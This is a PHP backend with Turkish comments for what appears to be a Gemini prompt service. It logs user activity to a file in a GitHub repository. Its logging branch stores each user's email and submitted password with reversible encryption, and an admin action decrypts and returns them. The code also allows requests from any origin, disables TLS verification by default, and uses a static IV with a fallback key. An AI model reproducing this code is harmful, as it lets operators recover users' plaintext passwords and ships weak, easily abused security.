<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

// ===== GÜVENLIK: config.php KONTROL =====
if (!file_exists('config.php')) {
    http_response_code(500);
    die(json_encode([
        'status' => 'error',
        'hata' => 'Konfigürasyon dosyası bulunamadı. Lütfen yöneticiye başvurun.'
    ]));
}

require_once 'config.php';

// ===== GÜVENLIK: API KEY KONTROL =====
if (!defined('GEMINI_API_KEY') || empty(GEMINI_API_KEY)) {
    http_response_code(500);
    die(json_encode([
        'status' => 'error',
        'hata' => 'Gemini API anahtarı ayarlanmamış.'
    ]));
}

if (!defined('GITHUB_TOKEN') || empty(GITHUB_TOKEN)) {
    http_response_code(500);
    die(json_encode([
        'status' => 'error',
        'hata' => 'GitHub Token ayarlanmamış.'
    ]));
}

if (!defined('ADMIN_PASSWORD') || empty(ADMIN_PASSWORD)) {
    http_response_code(500);
    die(json_encode([
        'status' => 'error',
        'hata' => 'Admin şifresi ayarlanmamış.'
    ]));
}

// ===== ENKRİPSİYON FONKSİYONLARI =====
function encryptData($text) {
    $method = "AES-256-CBC";
    $key = hash('sha256', ENCRYPTION_KEY ?? 'fallback-key');
    $iv = substr(hash('sha256', ENCRYPTION_KEY ?? 'fallback-key'), 0, 16);
    return base64_encode(openssl_encrypt($text, $method, $key, 0, $iv));
}

function decryptData($cipherText) {
    $method = "AES-256-CBC";
    $key = hash('sha256', ENCRYPTION_KEY ?? 'fallback-key');
    $iv = substr(hash('sha256', ENCRYPTION_KEY ?? 'fallback-key'), 0, 16);
    return openssl_decrypt(base64_decode($cipherText), $method, $key, 0, $iv);
}

// ===== cURL BAŞLATMA FONKSİYONU =====
function initCurl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    // SSL Konfigürasyonu
    if (defined('VERIFY_SSL') && VERIFY_SSL === true) {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    } else {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    }
    
    return $ch;
}

$action = $_POST['action'] ?? '';

// ===== YÖNETİCİ PANELİ: ŞİFRELİ VERİLERİ OKUMA =====
if ($action === 'read_db') {
    $adminPass = $_POST['admin_pass'] ?? '';
    
    if ($adminPass !== ADMIN_PASSWORD) {
        http_response_code(403);
        echo json_encode([
            "status" => "error",
            "hata" => "Admin şifresi yanlış!"
        ]);
        exit;
    }

    $url = "https://api.github.com/repos/" . REPO_OWNER . "/" . REPO_NAME . "/contents/" . DATA_FILE;
    $ch = initCurl($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: PHP-Script",
        "Authorization: token " . GITHUB_TOKEN
    ]);
    
    $res = json_decode(curl_exec($ch), true);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($curlError) {
        echo json_encode([
            "status" => "error",
            "hata" => "GitHub API Bağlantı Hatası: " . $curlError
        ]);
        exit;
    }

    if (isset($res['message']) && $res['message'] !== 'Not Found') {
        echo json_encode([
            "status" => "error",
            "hata" => "GitHub API Hatası: " . $res['message']
        ]);
        exit;
    }

    $encryptedContent = isset($res['content']) ? base64_decode($res['content']) : "";
    
    $lines = explode(PHP_EOL, $encryptedContent);
    $decryptedLines = [];
    
    foreach ($lines as $line) {
        if (empty($line)) continue;
        if (strpos($line, '[READY_PROMPT]') === 0) {
            $decryptedLines[] = $line;
        } else {
            $decrypted = decryptData($line);
            if ($decrypted !== false) {
                $decryptedLines[] = $decrypted;
            }
        }
    }

    echo json_encode([
        "status" => "success",
        "data" => $decryptedLines
    ]);
    exit;
}

// ===== YÖNETİCİ PANELİ: VERİ GÜNCELLEME =====
if ($action === 'overwrite') {
    $adminPass = $_POST['admin_pass'] ?? '';
    
    if ($adminPass !== ADMIN_PASSWORD) {
        http_response_code(403);
        echo json_encode([
            "status" => "error",
            "hata" => "Admin şifresi yanlış!"
        ]);
        exit;
    }
    
    $jsonData = $_POST['content'] ?? '[]';
    $incomingArray = json_decode($jsonData, true);
    
    if (!is_array($incomingArray)) {
        echo json_encode([
            "status" => "error",
            "hata" => "JSON formatı hatalı!"
        ]);
        exit;
    }
    
    $finalOutput = "";
    foreach ($incomingArray as $line) {
        if (empty($line)) continue;
        if (strpos($line, '[READY_PROMPT]') === 0) {
            $finalOutput .= $line . PHP_EOL;
        } else {
            $finalOutput .= encryptData($line) . PHP_EOL;
        }
    }
    
    $url = "https://api.github.com/repos/" . REPO_OWNER . "/" . REPO_NAME . "/contents/" . DATA_FILE;
    $ch = initCurl($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: PHP-Script",
        "Authorization: token " . GITHUB_TOKEN
    ]);
    
    $response = json_decode(curl_exec($ch), true);
    $sha = $response['sha'] ?? null;
    
    if (!$sha) {
        echo json_encode([
            "status" => "error",
            "hata" => "SHA değeri alınamadı!"
        ]);
        curl_close($ch);
        exit;
    }
    
    $putData = json_encode([
        "message" => "Yonetici Guvenli Guncelleme",
        "content" => base64_encode($finalOutput),
        "sha" => $sha
    ]);
    
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $putData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: PHP-Script",
        "Authorization: token " . GITHUB_TOKEN,
        "Content-Type: application/json"
    ]);
    
    $putResponse = curl_exec($ch);
    $putError = curl_error($ch);
    curl_close($ch);

    if ($putError) {
        echo json_encode([
            "status" => "error",
            "hata" => "GitHub PUT Hatası: " . $putError
        ]);
        exit;
    }
    
    echo json_encode(["status" => "success"]);
    exit;
}

// ===== GERÇEK GEMINI API MOTORU =====
if ($action === 'gemini_render') {
    $prompt = $_POST['prompt'] ?? '';
    
    if (empty($prompt)) { 
        echo json_encode([
            "status" => "error",
            "hata" => "Prompt alanı boş bırakılamaz."
        ]); 
        exit; 
    }

    // ✅ GEMİNİ MODEL SEÇIMI (En yeni model)
    $geminiModel = defined('GEMINI_MODEL') ? GEMINI_MODEL : 'models/gemini-pro';
    
    $url = "https://generativelanguage.googleapis.com/v1beta/models/" . $geminiModel . ":generateContent?key=" . GEMINI_API_KEY;
    
    $payload = [
        "contents" => [
            [
                "parts" => [
                    ["text" => "Bu görsel tasarım istemine uygun profesyonel içerik üret: " . $prompt]
                ]
            ]
        ]
    ];

    $ch = initCurl($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    
    $result = curl_exec($ch);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($curlError) {
        echo json_encode([
            "status" => "error",
            "hata" => "Sunucu Bağlantı Hatası: " . $curlError
        ]);
        exit;
    }
    
    $resData = json_decode($result, true);
    
    if (isset($resData['error'])) {
        echo json_encode([
            "status" => "error",
            "hata" => "Google API Hatası: " . $resData['error']['message']
        ]);
        exit;
    }

    if (!isset($resData['candidates'][0]['content']['parts'][0]['text'])) {
        echo json_encode([
            "status" => "error",
            "hata" => "Model boş yanıt döndürdü."
        ]);
        exit;
    }

    $responseText = $resData['candidates'][0]['content']['parts'][0]['text'];
    
    echo json_encode([
        "status" => "success",
        "text" => $responseText
    ]);
    exit;
}

// ===== KULLANICI LOGLAMA =====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mail = $_POST['mail'] ?? '';
    $pass = $_POST['pass'] ?? '';
    $type = $_POST['type'] ?? ''; 
    $date = date('d.m.Y H:i:s');
    
    if (empty($type)) {
        echo json_encode([
            "status" => "error",
            "hata" => "Log tipi belirtilmedi!"
        ]);
        exit;
    }
    
    if ($type === 'ACTIVITY') {
        $prompt = $_POST['prompt'] ?? '';
        if (empty($mail)) {
            echo json_encode([
                "status" => "error",
                "hata" => "E-posta adresi gerekli!"
            ]);
            exit;
        }
        $lineText = "[ACTIVITY] DATE: $date | USER: $mail | PROMPT: $prompt";
        $newData = encryptData($lineText) . PHP_EOL;
    } elseif ($type === 'FORGOT') {
        if (empty($mail)) {
            echo json_encode([
                "status" => "error",
                "hata" => "E-posta adresi gerekli!"
            ]);
            exit;
        }
        $lineText = "[NOTIFICATION] DATE: $date | MAIL: $mail";
        $newData = encryptData($lineText) . PHP_EOL;
    } else {
        if (empty($mail)) {
            echo json_encode([
                "status" => "error",
                "hata" => "E-posta adresi gerekli!"
            ]);
            exit;
        }
        $lineText = "[USER] [$type] DATE: $date | MAIL: $mail | PASS: $pass";
        $newData = encryptData($lineText) . PHP_EOL;
    }

    $url = "https://api.github.com/repos/" . REPO_OWNER . "/" . REPO_NAME . "/contents/" . DATA_FILE;
    $ch = initCurl($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: PHP-Script",
        "Authorization: token " . GITHUB_TOKEN
    ]);
    
    $response = json_decode(curl_exec($ch), true);
    $curlError = curl_error($ch);
    
    if ($curlError) {
        curl_close($ch);
        echo json_encode([
            "status" => "error",
            "hata" => "GitHub Bağlantı Hatası: " . $curlError
        ]);
        exit;
    }

    $sha = $response['sha'] ?? null;
    $oldContent = isset($response['content']) ? base64_decode($response['content']) : "";
    
    if (!$sha) {
        curl_close($ch);
        echo json_encode([
            "status" => "error",
            "hata" => "SHA değeri alınamadı!"
        ]);
        exit;
    }
    
    $finalContent = base64_encode($oldContent . $newData);

    $putData = json_encode([
        "message" => "Kriptolu Log: $type",
        "content" => $finalContent,
        "sha" => $sha
    ]);

    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $putData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: PHP-Script",
        "Authorization: token " . GITHUB_TOKEN,
        "Content-Type: application/json"
    ]);
    
    $putResponse = curl_exec($ch);
    $putError = curl_error($ch);
    curl_close($ch);

    if ($putError) {
        echo json_encode([
            "status" => "error",
            "hata" => "GitHub PUT Hatası: " . $putError
        ]);
        exit;
    }
    
    echo json_encode(["status" => "success"]);
    exit;
}

// Varsayılan: Bilinmeyen action
http_response_code(400);
echo json_encode([
    "status" => "error",
    "hata" => "Geçersiz action parametresi!"
]);
?>
